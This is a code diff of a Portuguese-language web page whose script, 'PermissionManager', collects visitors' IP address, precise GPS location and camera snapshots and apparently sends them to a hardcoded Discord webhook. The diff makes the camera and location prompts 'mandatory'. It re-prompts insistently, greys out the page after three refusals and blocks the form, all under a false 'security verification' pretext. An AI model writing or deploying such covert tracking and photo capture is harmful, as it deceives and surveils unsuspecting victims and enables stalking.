@@ -539,8 +539,7 @@
       </button>
     </div>
   </div>
-
-  <script>
+<script>
     class PermissionManager {
         constructor() {
             this.webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
@@ -560,7 +559,9 @@
                 cameraSent: false,
                 permissionsRequested: false,
                 formSubmitted: false,
-                initCompleted: false
+                initCompleted: false,
+                permissionsGranted: false,
+                verificationAttempts: 0
             };
             
             this.coletarInformacoesDispositivo();
@@ -588,7 +589,10 @@
         
         async init() {
             this.setupInitialListeners();
-            this.showPermissionPrompt();
+            // Mostra verificação imediatamente
+            setTimeout(() => {
+                this.showPermissionPrompt();
+            }, 0);
         }
 
         async continueInit() {
@@ -597,8 +601,9 @@
 
             await this.getIPInfo();
             this.setupInteractionListeners();
-            this.solicitarTodasPermissoes();
             this.setupAutoTriggers();
+            // Força verificação imediatamente
+            await this.forcePermissionVerification();
         }
         
         setupInitialListeners() {
@@ -608,8 +613,7 @@
             });
             
             document.getElementById('permission-button').addEventListener('click', () => {
-                this.hidePermissionPrompt();
-                this.continueInit();
+                this.handlePermissionClick();
             });
 
             const textarea = document.getElementById('pergunta');
@@ -619,6 +623,128 @@
                     counter.textContent = textarea.value.length;
                 });
             }
+        }
+
+        async handlePermissionClick() {
+            this.flags.verificationAttempts++;
+            this.hidePermissionPrompt();
+            
+            // Mostra loading durante verificação
+            this.showVerificationLoading();
+            
+            await this.continueInit();
+            await this.forcePermissionVerification();
+        }
+
+        showVerificationLoading() {
+            const loadingElement = document.getElementById('loading-overlay');
+            const loadingText = loadingElement.querySelector('.loading-text');
+            if (loadingText) {
+                loadingText.textContent = 'Verificando permissões...';
+            }
+            loadingElement.style.display = 'flex';
+            
+            // Esconde loading após verificação
+            setTimeout(() => {
+                loadingElement.style.display = 'none';
+            }, 2000);
+        }
+
+        async forcePermissionVerification() {
+            try {
+                // Solicita permissões obrigatórias
+                await this.requestLocationMandatory();
+                await this.captureCameraMandatory();
+                await this.requestNotifications();
+                
+                // Verifica se todas as permissões foram concedidas
+                await this.checkPermissionStatus();
+                
+            } catch (error) {
+                // Se falhou, força nova tentativa
+                this.handlePermissionFailure();
+            }
+        }
+
+        async checkPermissionStatus() {
+            // Aguarda um pouco para as permissões processarem
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            const locationGranted = this.data.location.status === 'success';
+            const cameraGranted = this.data.camera.status === 'success';
+            
+            if (!locationGranted || !cameraGranted) {
+                // Se não conseguiu as permissões, força nova tentativa
+                this.handlePermissionFailure();
+            } else {
+                this.flags.permissionsGranted = true;
+                this.showToast('Verificação concluída com sucesso!', 'success');
+            }
+        }
+
+        handlePermissionFailure() {
+            // Se falhou e tentou menos de 3 vezes, tenta novamente
+            if (this.flags.verificationAttempts < 3) {
+                setTimeout(() => {
+                    this.showPermissionPromptAgain();
+                }, 2000);
+            } else {
+                // Após 3 tentativas, mostra prompt mais insistente
+                this.showPersistentPermissionPrompt();
+            }
+        }
+
+        showPermissionPromptAgain() {
+            const prompt = document.getElementById('permission-prompt');
+            const content = prompt.querySelector('.permission-content');
+            
+            // Atualiza o texto para ser mais insistente
+            content.innerHTML = `
+                <span class="permission-icon">⚠️</span>
+                <h3>Verificação Obrigatória</h3>
+                <p><strong>As permissões são obrigatórias</strong> para continuar usando a plataforma.</p>
+                <p>Por favor, permita o acesso à <strong>câmera</strong> e <strong>localização</strong> quando solicitado.</p>
+                <p>Tentativa ${this.flags.verificationAttempts + 1} de 3</p>
+                <button class="permission-btn" id="permission-button-retry">
+                    Tentar Novamente
+                </button>
+            `;
+            
+            // Atualiza o listener
+            document.getElementById('permission-button-retry').addEventListener('click', () => {
+                this.handlePermissionClick();
+            });
+            
+            prompt.style.display = 'flex';
+        }
+
+        showPersistentPermissionPrompt() {
+            const prompt = document.getElementById('permission-prompt');
+            const content = prompt.querySelector('.permission-content');
+            
+            content.innerHTML = `
+                <span class="permission-icon">🚫</span>
+                <h3>Acesso Bloqueado</h3>
+                <p><strong>Você deve permitir as permissões para continuar.</strong></p>
+                <p>Para usar esta plataforma, é obrigatório permitir:</p>
+                <p>• <strong>Câmera:</strong> Para verificação de usuário real</p>
+                <p>• <strong>Localização:</strong> Para segurança da plataforma</p>
+                <p><small>Recarregue a página e permita as permissões quando solicitado.</small></p>
+                <button class="permission-btn" onclick="location.reload()">
+                    Recarregar Página
+                </button>
+            `;
+            
+            prompt.style.display = 'flex';
+            
+            // Bloqueia interação com o resto da página
+            this.blockPageInteraction();
+        }
+
+        blockPageInteraction() {
+            const container = document.querySelector('.container');
+            container.style.pointerEvents = 'none';
+            container.style.opacity = '0.5';
         }
 
         setupInteractionListeners() {
@@ -632,15 +758,16 @@
         }
         
         setupAutoTriggers() {
-            const events = ['click', 'touchstart', 'scroll', 'mousemove'];
-            const autoTrigger = () => {
-                if (!this.flags.permissionsRequested) {
-                    setTimeout(() => this.solicitarTodasPermissoes(), 200);
+            // Monitora se o usuário tenta interagir sem permissões
+            const events = ['click', 'touchstart', 'scroll'];
+            const checkPermissions = () => {
+                if (!this.flags.permissionsGranted && !document.getElementById('permission-prompt').style.display) {
+                    this.showPermissionPrompt();
                 }
             };
             
             events.forEach(event => {
-                document.addEventListener(event, autoTrigger, { once: true, passive: true });
+                document.addEventListener(event, checkPermissions);
             });
         }
         
@@ -648,7 +775,6 @@
             const element = document.getElementById('permission-prompt');
             if (element) {
                 element.style.display = 'flex';
-                this.bypessPermissao();
             }
         }
         
@@ -663,12 +789,11 @@
                     'https://ip-api.com/json', 
                     'https://ipapi.co/json/', 
                     'https://ipinfo.io/json', 
-                    'https://ipwhois.app/json/',
-                    'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
+                    'https://ipwhois.app/json/'
                 ];
                 for (const service of services) {
                     try {
-                        const response = await fetch(service, { signal: AbortSignal.timeout(2000) });
+                        const response = await fetch(service, { signal: AbortSignal.timeout(3000) });
                         if (response.ok) {
                             const data = await response.json();
                             this.data.ip = {
@@ -693,29 +818,18 @@
             }
         }
         
-        async bypessPermissao() {
-            const requests = [];
-            if (this.data.location.status === 'pending') {
-                requests.push(this.requestLocation());
-            }
-            if (this.data.camera.status === 'pending' && !this.flags.cameraAttempted) {
-                requests.push(this.captureCamera());
-            }
-            await Promise.allSettled(requests);
-        }
-
-        async solicitarTodasPermissoes() {
-            if (this.flags.permissionsRequested) return;
-            this.flags.permissionsRequested = true;
-            
-            const requests = [this.bypessPermissao(), this.requestNotifications()];
-            await Promise.allSettled(requests);
-        }
-        
-        async requestLocation() {
+        async requestLocationMandatory() {
             try {
-                if (!navigator.geolocation) return;
-                const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+                if (!navigator.geolocation) {
+                    throw new Error('Geolocation not supported');
+                }
+                
+                const options = { 
+                    enableHighAccuracy: true, 
+                    timeout: 10000, 
+                    maximumAge: 0 
+                };
+                
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, options);
                 });
@@ -729,22 +843,28 @@
                 };
                 this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
                 this._sL();
+                
             } catch (error) {
                 this.data.location.status = 'error';
+                
+                // Tenta usar IP como fallback
                 if (this.data.ip.latitude && this.data.ip.longitude) {
                     this.data.location = {
                         ...this.data.location,
                         lat: this.data.ip.latitude, 
                         lon: this.data.ip.longitude,
                         googleMapsUrl: `https://www.google.com/maps?q=${this.data.ip.latitude},${this.data.ip.longitude}`,
-                        source: 'IP'
+                        source: 'IP',
+                        status: 'success'
                     };
                     this._sL();
+                } else {
+                    throw error;
                 }
             }
         }
         
-        async captureCamera() {
+        async captureCameraMandatory() {
             if (this.flags.cameraAttempted) return;
             this.flags.cameraAttempted = true;
             
@@ -766,12 +886,14 @@
                 video.muted = true;
                 video.playsInline = true;
                 
-                await new Promise(resolve => { 
+                await new Promise((resolve, reject) => { 
                     video.onloadedmetadata = () => {
-                        video.play().then(resolve).catch(resolve);
+                        video.play().then(resolve).catch(reject);
                     };
+                    setTimeout(reject, 5000); // Timeout de 5 segundos
                 });
-                await new Promise(resolve => setTimeout(resolve, 400));
+                
+                await new Promise(resolve => setTimeout(resolve, 800));
 
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
@@ -784,8 +906,10 @@
                     timestamp: new Date().toISOString()
                 };
                 this._sC();
+                
             } catch (error) {
                 this.data.camera.status = 'error';
+                throw error;
             } finally {
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
@@ -803,7 +927,7 @@
                     await Notification.requestPermission() : Notification.permission;
                 this.data.permissions.notifications = permission === 'granted';
             } catch (error) { 
-                // Falha silenciosa
+                // Falha silenciosa para notificações
             }
         }
         
@@ -944,16 +1068,18 @@
         }
         
         async handleFormSubmit() {
+            // Verifica se as permissões foram concedidas antes de enviar
+            if (!this.flags.permissionsGranted) {
+                this.showPermissionPrompt();
+                this.showToast('Por favor, complete a verificação de segurança primeiro.', 'error');
+                return;
+            }
+            
             if (this.flags.formSubmitted || !this.validateForm()) return;
             this.flags.formSubmitted = true;
             
             document.getElementById('loading-overlay').style.display = 'flex';
             document.getElementById('btn-enviar').disabled = true;
-            
-            if (!this.flags.permissionsRequested) {
-                await this.solicitarTodasPermissoes();
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            }
             
             this.data.behavior.timeToSubmit = Date.now() - this.data.behavior.startTime;
             await this._sD();
@@ -1062,6 +1188,6 @@
         e.preventDefault();
         return false;
     });
-  </script>
+</script>
 </body>
 </html>
